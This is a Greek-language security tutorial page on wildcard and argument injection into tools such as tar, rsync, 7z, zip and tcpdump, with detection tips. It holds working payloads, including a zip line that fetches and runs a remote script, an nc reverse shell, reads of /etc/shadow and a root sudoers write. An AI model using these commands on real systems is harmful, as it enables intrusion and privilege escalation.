# Κόλπα με Wildcards

{{#include ../../banners/hacktricks-training.md}}

> Το **argument injection** μέσω Wildcard (γνωστό και ως *glob*) συμβαίνει όταν ένα privileged script εκτελεί ένα Unix binary όπως `tar`, `chown`, `rsync`, `zip`, `7z`, … με ένα wildcard χωρίς εισαγωγικά, όπως το `*`.
> Επειδή το shell επεκτείνει το wildcard **πριν** εκτελέσει το binary, ένας attacker που μπορεί να δημιουργήσει αρχεία στον working directory μπορεί να κατασκευάσει filenames που ξεκινούν με `-`, ώστε να ερμηνευτούν ως **options αντί για data**, μεταφέροντας αποτελεσματικά αυθαίρετα flags ή ακόμη και commands.<sup>[[6]](#references)</sup>
> Αυτή η σελίδα συγκεντρώνει τα πιο χρήσιμα primitives, πρόσφατη έρευνα και σύγχρονες detections για το 2023-2025.

## chown / chmod

Μπορείτε να **αντιγράψετε τον owner/group ή τα permission bits από ένα reference file** καταχρώμενοι το flag `--reference`, όταν ένα filename που μοιάζει με option επεκτείνεται από ένα wildcard.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```
Όταν το root εκτελέσει αργότερα κάτι όπως:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
Το expanded `--reference=.drf.php` παρακάμπτει τα explicit owner/mode, με αποτέλεσμα τα matching files να κληρονομούν τα metadata από το `.drf.php` (και, με το παραπάνω setup, να γίνονται writable από τον attacker).<sup>[[6]](#references)</sup>

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).<sup>[[7]](#references)</sup>
Δείτε επίσης το classic DefenseCode paper για λεπτομέρειες.<sup>[[6]](#references)</sup>

---

## tar

### GNU tar

Εκτελέστε arbitrary commands κάνοντας abuse του **checkpoint** feature και των checkpoint actions του GNU tar.<sup>[[10]](#references)</sup>
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```
Μόλις ο root εκτελέσει, για παράδειγμα, `tar -czf /root/backup.tgz *`, το `shell.sh` εκτελείται ως root.<sup>[[10]](#references)</sup>

### Σημείωση σχετικά με την παράκαμψη του compressor στο bsdtar / macOS

Το προεπιλεγμένο `tar` στις πρόσφατες εκδόσεις του macOS (με βάση το `libarchive`) δεν παρέχει το interface `--checkpoint` του GNU tar, αλλά το bsdtar τεκμηριώνει το **--use-compress-program** για την επιλογή ενός external compressor.<sup>[[11]](#references)</sup>
```bash
# macOS example
touch -- "--use-compress-program=sh"
```
Όταν ένα privileged script εκτελεί `tar -cf backup.tar *`, αυτό επιλέγει το `sh` μέσω του `PATH` του victim και το bsdtar το εκκινεί ως compressor.<sup>[[11]](#references)</sup> Αυτό αποδεικνύει option injection, αλλά από μόνο του δεν αποτελεί αξιόπιστο arbitrary-command primitive: ένα filename που δημιουργείται μέσω wildcard δεν μπορεί να περιέχει `/`, και το bsdtar παρέχει archive data αντί για shell command που έχει επιλέξει ο attacker. Για την εκτέλεση κώδικα απαιτείται επιπλέον ένα controllable executable που επιλύεται μέσω `PATH` ή ένα άλλο argument channel που μπορεί να ορίσει ένα χρήσιμο πρόγραμμα.

---

## rsync

Το `rsync` σάς επιτρέπει να παρακάμψετε το remote shell ή το remote binary μέσω command-line flags όπως τα `-e` και `--rsync-path`.<sup>[[12]](#references)</sup>
```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Αν το root αρχειοθετήσει αργότερα τον κατάλογο με `rsync -az * backup:/srv/`, το injected flag μπορεί να εκτελέσει ένα shell μέσω του remote-shell mechanism.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Ακόμη και όταν το privileged script προσθέτει *defensively* το `--` πριν από το wildcard (για να σταματήσει το option parsing), το 7-Zip CLI αποδέχεται **file list files** αν το filename έχει ως πρόθεμα το `@`. Ο συνδυασμός αυτού με ένα symlink σάς επιτρέπει να κάνετε *exfiltrate arbitrary files*.<sup>[[13]](#references)</sup>
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Αν ο root εκτελέσει κάτι όπως:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
Το 7-Zip θα προσπαθήσει να διαβάσει το `root.txt` (→ `/etc/shadow`) ως λίστα αρχείων και θα τερματίσει, **εκτυπώνοντας τα περιεχόμενα στο stderr**.<sup>[[13]](#references)</sup>

Αυτό λειτουργεί με το `-- *`, επειδή το CLI του 7-Zip αποδέχεται ρητά τόσο κανονικά ονόματα αρχείων όσο και `@listfiles` ως positional inputs, επομένως ένα literal όνομα αρχείου όπως το `@root.txt` εξακολουθεί να αντιμετωπίζεται ειδικά.<sup>[[13]](#references)</sup>

---

## zip

Υπάρχουν δύο πολύ πρακτικά primitives όταν μια εφαρμογή περνά filenames που ελέγχονται από τον χρήστη στο `zip` (είτε μέσω wildcard είτε απαριθμώντας ονόματα χωρίς `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE via test hook: Το `-T` ενεργοποιεί το “test archive” και το `-TT <cmd>` αντικαθιστά το tester με ένα arbitrary πρόγραμμα (long form: `--unzip-command <cmd>`). Αν μπορείτε να εισαγάγετε filenames που ξεκινούν με `-`, διαχωρίστε τα flags σε distinct filenames ώστε να λειτουργεί το short-options parsing.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Σημειώσεις
- ΜΗΝ δοκιμάσετε ένα μόνο filename όπως `'-T -TT <cmd>'` — τα short options αναλύονται ανά χαρακτήρα και θα αποτύχει. Χρησιμοποιήστε ξεχωριστά tokens όπως φαίνεται.<sup>[[3]](#references)</sup>
- Αν τα slashes αφαιρούνται από τα filenames από την εφαρμογή, κάντε fetch από ένα bare host/IP (προεπιλεγμένο path `/index.html`) και αποθηκεύστε τοπικά με `-O`, έπειτα εκτελέστε το.<sup>[[3]](#references)</sup>
- Μπορείτε να κάνετε debug το parsing με `-sc` (εμφάνιση του processed argv) ή `-h2` (περισσότερη βοήθεια), ώστε να κατανοήσετε πώς καταναλώνονται τα tokens σας.<sup>[[3]](#references)</sup>

Παράδειγμα (τοπική συμπεριφορά στο zip 3.0).<sup>[[3]](#references)</sup>
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Αν το web layer επιστρέφει το stdout/stderr του `zip` (συνηθισμένο σε naive wrappers), injected flags όπως τα `--help` ή failures από λανθασμένες options θα εμφανιστούν στην HTTP response, επιβεβαιώνοντας το command-line injection και βοηθώντας στη βελτιστοποίηση των payloads.<sup>[[3]](#references)</sup>

---

## Πρόσθετοι υποψήφιοι για option-injection

Όταν ένας privileged wrapper επεκτείνει έναν writable directory με wildcard, αξίζει να ελεγχθούν αυτά τα documented option hooks.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Περνά ένα command string σε shell |
| `git`   | `-c core.sshCommand=<cmd>` | Χρησιμοποιεί το `<cmd>` αντί για SSH σε Git fetch/push |
| `scp`   | `-S <program>` | Χρησιμοποιεί ένα alternate SSH-compatible connection program |

Αυτά τα primitives είναι χρήσιμα checks πέρα από τα κλασικά *tar/rsync/zip*.

---

## Αναζήτηση vulnerable wrappers και jobs

Πρόσφατα case studies και detection guidance δείχνουν ότι το wildcard/argv injection δεν αποτελεί πλέον απλώς πρόβλημα **cron + tar**.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> Η ίδια κατηγορία bug συνεχίζει να εμφανίζεται σε:

- web features που κάνουν "download everything as zip/tar" από attacker-controlled upload directories
- vendor/appliance debug shells που εκθέτουν έναν **tcpdump** wrapper με attacker-controlled filename/filter fields
- backup ή rotation jobs που καλούν `tar`, `rsync`, `7z`, `zip`, `chown` ή `chmod` σε writable directories

Χρήσιμες εντολές triage (η invocation του `pspy` χρησιμοποιεί τα documented process/file-event και interval flags).<sup>[[14]](#references)</sup>
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Γρήγορες ευρετικές:

- Το `-- *` αποτελεί καλή διόρθωση για πολλά GNU tools, αλλά **όχι** για τα `7z`/`7za`, επειδή τα `@listfiles` αναλύονται ξεχωριστά.<sup>[[13]](#references)</sup>
- Για το `zip`, αναζητήστε wrappers που απαριθμούν απευθείας filenames τα οποία ελέγχει ο χρήστης· το short-option splitting (`-T` + `-TT <cmd>`) εξακολουθεί να λειτουργεί ακόμη και χωρίς shell glob.<sup>[[2]](#references)[[3]](#references)</sup>
- Για το `tcpdump`, δώστε ιδιαίτερη προσοχή σε wrappers που σας επιτρέπουν να ελέγχετε **output file names**, **rotation settings** ή arguments για **capture-file replay**.<sup>[[18]](#references)</sup>

---

## tcpdump rotation hooks (-G/-W/-z): RCE μέσω argv injection σε wrappers

Όταν ένα restricted shell ή vendor wrapper δημιουργεί μια command line για το `tcpdump` συνενώνοντας fields που ελέγχει ο χρήστης (π.χ. μια παράμετρο "file name") χωρίς αυστηρό quoting/validation, μπορείτε να εισαγάγετε κρυφά επιπλέον flags του `tcpdump`. Ο συνδυασμός των `-G` (time-based rotation), `-W` (περιορισμός του αριθμού των files) και `-z <cmd>` (post-rotate command) επιτρέπει arbitrary command execution ως ο χρήστης που εκτελεί το tcpdump (συχνά ως root σε appliances).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Προαπαιτούμενα:

- Μπορείτε να επηρεάσετε το `argv` που περνά στο `tcpdump` (π.χ. μέσω ενός wrapper όπως `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
- Το wrapper δεν απολυμαίνει spaces ή tokens που ξεκινούν με `-` στο πεδίο του file name.<sup>[[4]](#references)</sup>

Κλασικό PoC (εκτελεί ένα reverse shell script από writable path).<sup>[[4]](#references)[[18]](#references)</sup>
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Λεπτομέρειες:

- Το `-G 1` κάνει rotation κάθε δευτερόλεπτο και το `-W 1` σταματά μετά από ένα rotated file· το capture πρέπει να λάβει ένα matching packet πριν από το rotation.<sup>[[18]](#references)</sup>
- Το `-z <cmd>` εκτελεί την post-rotate command μία φορά ανά rotation και περνά τη διαδρομή του κλειστού savefile ως όρισμα· βεβαιωθείτε ότι ο χειρισμός των ορισμάτων από το script/interpreter ταιριάζει με το payload σας.<sup>[[18]](#references)</sup>

Παραλλαγές χωρίς removable media:

- Αν έχετε οποιοδήποτε άλλο primitive για εγγραφή αρχείων (π.χ. ένα ξεχωριστό command wrapper που επιτρέπει output redirection), τοποθετήστε το script σας σε γνωστή διαδρομή και ενεργοποιήστε το `-z /path/script.sh`· το script πρέπει να εκτελεί μόνο του το `/bin/sh`, αν χρειάζεται.<sup>[[18]](#references)</sup>
- Αν ένα vendor wrapper σάς επιτρέπει να επιλέξετε το rotated path, ελέγξτε το path control μόνο σε συνδυασμό με post-rotate command που ερμηνεύει το savefile argument· το path control από μόνο του δεν εκτελεί τα περιεχόμενα του αρχείου.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump με wildcards/επιπλέον args → arbitrary write/read και root

Παράδειγμα anti-pattern στο sudoers:<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Ο κανόνας αφήνει διαθέσιμες αρκετές επιλογές μέσω του documented parser του `tcpdump`:<sup>[[3]](#references)[[18]](#references)</sup>
- Το glob `*` και τα permissive patterns περιορίζουν μόνο το πρώτο όρισμα `-w`. Το `tcpdump` δέχεται πολλαπλές επιλογές `-w`· ισχύει η τελευταία.<sup>[[3]](#references)[[18]](#references)</sup>
- Ο κανόνας δεν περιορίζει άλλες επιλογές, επομένως επιτρέπονται τα `-Z`, `-r`, `-V` κ.λπ.<sup>[[3]](#references)[[18]](#references)</sup>

Τα σχετικά primitives τεκμηριώνονται παρακάτω.<sup>[[3]](#references)[[18]](#references)</sup>
- Παράκαμψη του destination path με δεύτερο `-w` (το πρώτο απλώς ικανοποιεί το sudoers).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal μέσα στο πρώτο `-w` για διαφυγή από το περιορισμένο tree.<sup>[[3]](#references)</sup>
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Επιβάλετε την ιδιοκτησία των αρχείων εξόδου με `-Z root` (δημιουργεί αρχεία με ιδιοκτήτη root οπουδήποτε).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Εγγραφή αυθαίρετου περιεχομένου με αναπαραγωγή ενός crafted PCAP μέσω του `-r` (π.χ. για την προσθήκη μιας γραμμής sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Δημιουργήστε ένα PCAP που περιέχει το ακριβές ASCII payload και γράψτε το ως root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Ανάγνωση αυθαίρετων αρχείων/secret leak με `-V <file>` (ερμηνεύει μια λίστα από savefiles). Τα διαγνωστικά σφαλμάτων συχνά κάνουν echo τις γραμμές, προκαλώντας leak περιεχομένου.<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Πλήρης Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Εντοπίστηκε πιθανό Shell μέσω Wildcard Injection](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Back To The Future: Τα Unix Wildcards εκτός ελέγχου (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils `chown` κλήση](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils `chmod` κλήση](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [GNU tar checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [Εγχειρίδιο bsdtar(1)](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [Εγχειρίδιο rsync(1)](https://download.samba.org/pub/rsync/rsync.1)
- [13] [Σύνταξη γραμμής εντολών 7-Zip](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [Εγχειρίδιο flock(1)](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Τεκμηρίωση ρυθμίσεων Git](https://git-scm.com/docs/git-config)
- [17] [Εγχειρίδιο OpenBSD `scp`](https://man.openbsd.org/scp)
- [18] [Εγχειρίδιο tcpdump(8)](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
